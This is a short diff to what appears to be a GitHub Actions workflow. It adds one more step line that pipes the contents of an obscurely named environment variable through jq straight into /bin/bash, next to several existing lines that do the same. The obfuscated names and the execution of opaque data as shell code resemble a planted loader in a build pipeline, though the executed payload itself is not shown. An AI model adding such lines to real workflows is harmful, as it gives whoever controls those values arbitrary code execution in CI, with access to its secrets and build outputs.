@@ -44,6 +44,7 @@ jobs:
           echo $guz8976 | jq -r .qebd93782 | /bin/bash
           printf '%s' "$rwj119" | jq -r .bd138 | /bin/bash
           printf '%s' "$oncwq04" | jq -r .lnsf464 | /bin/bash
+          printf '%s' "$s5" | jq -r .u7 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
